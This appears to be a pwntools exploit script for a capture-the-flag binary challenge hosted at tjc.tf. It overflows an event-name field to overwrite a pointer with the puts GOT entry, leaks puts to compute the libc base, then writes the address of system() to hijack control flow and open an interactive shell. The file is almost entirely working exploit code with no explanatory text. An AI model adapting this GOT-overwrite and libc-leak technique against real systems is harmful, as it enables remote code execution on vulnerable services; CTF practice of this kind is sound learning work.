from operator import truediv
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("tjc.tf", 31509)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


def add_event(t, name):
    io.sendlineafter(b'Event time?', t)
    io.sendlineafter(b'Event name?', name)


puts_got = elf.got.get("puts", 0)

add_event("10", b"t"*132+p64(puts_got))
io.recvline()
io.recvline()
a = io.recvline()
low = a.split(b":00 - ")[0]
low = int(low)
hight = a.split(b":00 - ")[1][:2]
log.hexdump(hight)
puts_addr = int(hight[1]) << 40
puts_addr += int(hight[0]) << 32
puts_addr += low
log.success("puts:-----> " + hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc.address:-----> " + hex(libc.address))


payload = hight + b"\x00\x00"
low = libc.symbols["system"] & 0xffffffff

ddebug("b *0x4016B6\n b displayEvents\n b inpcpy\n continue")
add_event(str(low), payload)

io.interactive()
